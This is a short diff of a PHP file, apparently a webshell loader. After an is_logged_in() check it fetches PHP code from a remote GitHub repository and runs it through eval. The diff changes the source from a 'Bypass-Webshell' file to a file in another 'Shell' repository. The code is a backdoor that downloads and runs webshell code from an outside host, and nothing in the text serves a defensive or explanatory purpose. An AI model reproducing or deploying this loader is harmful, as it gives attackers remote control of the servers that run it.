@@ -56,7 +56,7 @@ function is_logged_in() {
 
 if (is_logged_in()) {
  
-    $a = fetchRemoteContent('https://github.com/sagsooz/Bypass-Webshell/raw/main/alfa2024.php');
+    $a = fetchRemoteContent('https://github.com/ardifx01/Shell/raw/main/al.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
